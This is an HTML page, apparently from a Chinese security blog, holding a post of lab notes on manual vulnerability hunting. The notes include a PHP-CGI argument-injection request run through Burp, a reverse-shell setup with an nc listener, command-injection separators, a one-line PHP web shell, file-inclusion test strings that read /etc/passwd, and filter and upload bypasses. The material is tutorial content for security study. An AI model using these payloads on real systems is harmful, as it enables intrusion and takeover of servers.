@@ -1,0 +1,501 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+<!-- Google Analytics -->
+<script>
+window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+ga('create', 'UA-112417276-1', 'auto');
+ga('send', 'pageview');
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<!-- End Google Analytics -->
+
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>手动漏洞挖掘（一） | Recall Hyx | Your star</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="漏洞">
+    <meta name="description" content="手动挖掘原则 所有变量 所有头cookie中的变量+逐个变量删除  默认安装漏洞 windows默认安装漏洞   phpMyAdmin/setup Ubuntu/Debian 默认安装 PHP5-cgi 可直接访问 /cgi-bin/php5 和 /cgi-bin/php123456POST http://192.168.133.132/phpMyAdmin/?-d+allow_url_inclu">
+<meta name="keywords" content="漏洞">
+<meta property="og:type" content="article">
+<meta property="og:title" content="手动漏洞挖掘（一）">
+<meta property="og:url" content="http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/index.html">
+<meta property="og:site_name" content="Recall Hyx">
+<meta property="og:description" content="手动挖掘原则 所有变量 所有头cookie中的变量+逐个变量删除  默认安装漏洞 windows默认安装漏洞   phpMyAdmin/setup Ubuntu/Debian 默认安装 PHP5-cgi 可直接访问 /cgi-bin/php5 和 /cgi-bin/php123456POST http://192.168.133.132/phpMyAdmin/?-d+allow_url_inclu">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-ed170676275e5c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-8aac7376c85d4382.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="http://upload-images.jianshu.io/upload_images/5834506-47baca2fbab4883e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-02-01T07:58:29.880Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="手动漏洞挖掘（一）">
+<meta name="twitter:description" content="手动挖掘原则 所有变量 所有头cookie中的变量+逐个变量删除  默认安装漏洞 windows默认安装漏洞   phpMyAdmin/setup Ubuntu/Debian 默认安装 PHP5-cgi 可直接访问 /cgi-bin/php5 和 /cgi-bin/php123456POST http://192.168.133.132/phpMyAdmin/?-d+allow_url_inclu">
+<meta name="twitter:image" content="http://upload-images.jianshu.io/upload_images/5834506-ed170676275e5c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Recall HYX</h5>
+          <a href="mailto:quce.hu@qq.com" title="quce.hu@qq.com" class="mail">quce.hu@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                文章
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/recallhyx" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">手动漏洞挖掘（一）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">手动漏洞挖掘（一）</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-01-27T07:20:44.000Z" itemprop="datePublished" class="page-time">
+  2018-01-27
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#手动挖掘原则"><span class="post-toc-number">1.</span> <span class="post-toc-text">手动挖掘原则</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#默认安装漏洞"><span class="post-toc-number">2.</span> <span class="post-toc-text">默认安装漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#命令行注入漏洞"><span class="post-toc-number">3.</span> <span class="post-toc-text">命令行注入漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#目录权限限制不严-文件包含漏洞"><span class="post-toc-number">4.</span> <span class="post-toc-text">目录权限限制不严/文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#文件上传漏洞"><span class="post-toc-number">5.</span> <span class="post-toc-text">文件上传漏洞</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-手动漏洞挖掘（一）"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">手动漏洞挖掘（一）</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-01-27 15:20:44" datetime="2018-01-27T07:20:44.000Z"  itemprop="datePublished">2018-01-27</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h2 id="手动挖掘原则"><a href="#手动挖掘原则" class="headerlink" title="手动挖掘原则"></a>手动挖掘原则</h2><ul>
+<li>所有变量</li>
+<li>所有头<br>cookie中的变量<br>+逐个变量删除</li>
+</ul>
+<h2 id="默认安装漏洞"><a href="#默认安装漏洞" class="headerlink" title="默认安装漏洞"></a>默认安装漏洞</h2><ul>
+<li>windows默认安装漏洞</li>
+</ul>
+<ul>
+<li>phpMyAdmin/setup</li>
+<li>Ubuntu/Debian 默认安装 PHP5-cgi</li>
+<li>可直接访问 /cgi-bin/php5 和 /cgi-bin/php<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">http://192.168.133.132/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 192.168.20.10</span><br><span class="line"></span><br><span class="line"><span class="attribute">passthru('ls');</span></span><br><span class="line"><span class="attribute">die();</span></span><br><span class="line"><span class="attribute">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>以上这段放在Burpsuite的<code>Repeater</code>重放攻击，修改主机地址和目标ip地址，就能实现攻击，在php代码里面修改命令就能看到该服务器权限下能执行的命令结果  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-ed170676275e5c2d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>php反弹shell<br>它在kali的位置<br>/usr/share/webshells/php/php-reverse-shell.php<br>修改一下，把IP换成本机的IP地址<br>然后将所有内容复制下来复制到在burpsuite的body中<br><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="http://upload-images.jianshu.io/upload_images/5834506-8aac7376c85d4382.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>  </p>
+<p>如配置文件中侦听对应的端口<code>nc -nvvlp 1234</code>再发送请求，就能在终端看到信息了  </p>
+<p><img src="http://upload-images.jianshu.io/upload_images/5834506-47baca2fbab4883e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br>接下来输入的系统指令只要有权限就能执行</p>
+<h2 id="命令行注入漏洞"><a href="#命令行注入漏洞" class="headerlink" title="命令行注入漏洞"></a>命令行注入漏洞</h2><p>如果网站有直接调用系统指令，如<code>ping</code>之类，可以用以下指令注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 分号，代表与指令分隔  例：ping <span class="number">172.16</span><span class="number">.242</span><span class="number">.128</span>;ls 执行完ping之后就执行ls</span><br><span class="line">&amp;&amp; 双与，代表前面一个指令成功后，才能执行后面一个指令 例：ping <span class="number">172.16</span><span class="number">.242</span><span class="number">.128</span>&amp;&amp;ls 在ping指令成功后才会执行ls</span><br><span class="line">&amp; 单与，代表两条命令同时执行</span><br><span class="line">|| 双或，代表当前面一个命令执行失败，才执行后面一个指令</span><br></pre></td></tr></table></figure></p>
+<h2 id="目录权限限制不严-文件包含漏洞"><a href="#目录权限限制不严-文件包含漏洞" class="headerlink" title="目录权限限制不严/文件包含漏洞"></a>目录权限限制不严/文件包含漏洞</h2><p>针对运行php的服务器的远程文件包含漏洞，需要服务器的/etc/php5/cgi/php.ini中allow_url_include=On，然后重启apache服务器才有用  </p>
+<p>一句话木马<br><code>&lt;?php echo shell_exec($_GET[&#39;cmd&#39;]); ?&gt;</code><br>特征但不绝对：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">page</span>=a.php</span><br><span class="line">?<span class="attribute">home</span>=b.html</span><br><span class="line">?<span class="attribute">file</span>=content</span><br></pre></td></tr></table></figure></p>
+<p>经典测试方法：<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../etc/passwd</span><br><span class="line">?page=file:<span class="comment">///etc/passwd</span></span><br><span class="line">?home=main.cgi</span><br><span class="line">?page=http:<span class="comment">//www.a.com/1.php</span></span><br><span class="line">http:<span class="comment">//1.1.1.1/../../../../dir/file.txt</span></span><br></pre></td></tr></table></figure></p>
+<p>绕过字符过滤<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">. 点，有一些应用对图片判断是以<span class="string">.png</span>结尾，来判断是不是一张图片的，这个时候只需要 a.php.png，就能绕过检查</span><br><span class="line">%00 空，作为截断，有一些应用的文件检查是从头开始检查的，如果遇到%00,就表示结束，不会再继续，例如a.doc%00.php ，实际上是一个php文件，</span><br><span class="line">但是应用的检查以为是doc文件</span><br><span class="line">在请求中插入过滤 如果服务器过滤链接http:<span class="string">//</span>这串字符，这个时候只需要在这串字符中间再插入这串字符，如在h插入，变成hhttp:<span class="string">//ttp</span>:<span class="string">//</span>这样</span><br><span class="line">服务器就会过滤掉中间的http:<span class="string">//</span>，并把过滤后的字符串拼接回去</span><br></pre></td></tr></table></figure></p>
+<p>kali攻击字典放在<br><code>/usr/share/wfuzz/wordlist/vulns</code></p>
+<h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">将文件名后缀修改</span><br><span class="line">截断代理，将content-<span class="keyword">type</span>修改为允许的类型</span><br></pre></td></tr></table></figure>
+<p>怎么解决文件上传漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">限制上传目录的权限</span><br><span class="line">修改上传后文件的命名</span><br><span class="line">模糊上传文件目录的路径</span><br></pre></td></tr></table></figure></p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2018-02-01T07:58:29.880Z" itemprop="dateUpdated">2018-02-01 15:58:29</time>
+</span><br>
+
+
+        
+    </div>
+    
+    <footer>
+        <a href="http://yoursite.com">
+            <img src="/img/avatar.jpg" alt="Recall HYX">
+            Recall HYX
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞/">漏洞</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/&title=《手动漏洞挖掘（一）》 — Recall Hyx&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/&title=《手动漏洞挖掘（一）》 — Recall Hyx&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《手动漏洞挖掘（一）》 — Recall Hyx&url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2018/01/27/手动漏洞挖掘（二）/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">手动漏洞挖掘（二）</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/01/25/安全工具介绍（三）/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">安全工具介绍（三）</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+<section class="comments" id="comments">
+    <div id="disqus_thread"></div>
+    <script>
+    var disqus_shortname = 'recallhyx';
+    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.jpg" data-alipay="/img/alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+
+        <p>
+            
+            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Recall HYX &copy; 2017 - 2018</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/&title=《手动漏洞挖掘（一）》 — Recall Hyx&pic=http://yoursite.com/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/&title=《手动漏洞挖掘（一）》 — Recall Hyx&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《手动漏洞挖掘（一）》 — Recall Hyx&url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/&via=http://yoursite.com" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://yoursite.com/2018/01/27/手动漏洞挖掘（一）/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACK0lEQVR42u3aQXKDMAwF0N7/0ummuxT4kkg72I9VpgPGL51RZElfX/H1Orje70nuP1/h/e+3XRgYGI9lvE6v5J7eU+d7qK6AgYGxA+Mogp0H0yTgVsP30eeLPWNgYGAEIfJ8Q0e85OvAwMDA6AXcaOn4aPpvvxsYGBiPYvRCZ177qj77wbM4BgbGAxl51f3vP3+kv4GBgfEoxqTcnx9Nz8twk/bDz7MYGBhLM/IANyHddXC9eAsGBsYGjN6GqmMTVUBhbxgYGIsykgCaLzo/AOftzIv/AwYGxqKM8+HRarLYTO+CpsIvSAwMjKUZ1WSuGhDzpHOeLGJgYKzKSIYYqoMXSRvgLjwGBsZujGpRvnd/9dAbvR0DA2NpxmTa6nyhPIxWn8pXw8DAWIPRS8vy9LFXqqs2RzEwMHZgzNuWSVi8q5EZDVtgYGAsxOgNgfXCa7UB0LsfAwNjVUY1HUzaCXkLoVd6w8DA2I2Rl92rjYQ8pFaHyaJfDwwMjOUYk07CvNw2SRkxMDB2YNxV8MqfLYxK5CtgYGBswKhe+ZG1V8IrFwQxMDA2Y8yLX71U8rbjKwYGxkKMeZBtBsdBQwIDA2M3Rm9bkyL+R+ZEMDAwNmAkQXZSgKsecfM9YGBg7MYon30HL64OhxV6sBgYGBjFEtskPy23GTAwMDCKg6pJmlg9DF8cpDEwMDZgJIfYSditjmuU18HAwFiaUU3U8mCaNy9z5KjjgYGB8TzGNyMVnTtEkG06AAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
